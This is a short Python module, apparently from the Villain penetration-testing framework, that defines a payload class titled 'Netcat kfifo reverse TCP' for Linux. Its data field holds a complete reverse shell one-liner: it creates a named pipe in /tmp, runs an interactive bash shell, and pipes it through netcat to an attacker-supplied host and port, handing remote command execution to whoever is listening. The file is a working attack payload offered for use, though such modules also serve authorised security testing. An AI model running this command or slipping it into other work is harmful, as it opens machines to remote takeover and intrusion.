# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Netcat kfifo reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Netcat mkfifo reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'nc-mkfifo',
        'os' : 'linux'  
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc *LHOST* *LPORT* >/tmp/f"
